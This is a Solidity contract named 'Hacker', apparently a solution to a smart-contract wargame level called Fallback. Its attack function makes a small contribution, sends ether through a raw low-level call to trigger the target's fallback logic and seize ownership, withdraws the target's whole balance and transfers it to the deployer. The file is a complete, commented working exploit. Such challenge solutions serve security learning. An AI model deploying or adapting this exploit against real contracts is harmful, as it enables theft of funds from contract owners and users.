// SPDX-License-Identifier: MIT
pragma solidity >=0.8.5 <0.9.0;

interface FallbackInterface {
  function contribute() external payable;

  function withdraw() external;
}

contract Hacker {
  address payable public hacker;

  constructor() {
    hacker = payable(msg.sender);
  }

  modifier onlyHacker {
    require(msg.sender == hacker, "caller is not the hacker");
    _;
  }

  function attack(address _target) external payable onlyHacker {
    require(msg.value > (0.001 ether), "Not enough ether to attack.");

    uint256 contributionFee = 0.0005 ether;

    // 0. Get the target contract.
    FallbackInterface fallbackInstance = FallbackInterface(_target);

    // 1. Contribute with ether less than 0.001.
    fallbackInstance.contribute{value: contributionFee}();

    // 2. Send Transaction to claim owner, should set the gas as enough as the target contract is able to modify owner.
    assembly {
      pop( // discard result
        call(
          100000, // gas
          _target, // target address
          selfbalance(), // current balance
          0, // input location
          0, // no input params
          0, // output location
          0 // no need to use output params
        )
      )
    }

    // 3. Withdraw all ether
    fallbackInstance.withdraw();

    // 4. Put back into my pocket.
    hacker.transfer(address(this).balance);
  }

  // With it, it can receive ether from the target contract.
  receive() external payable {}
}
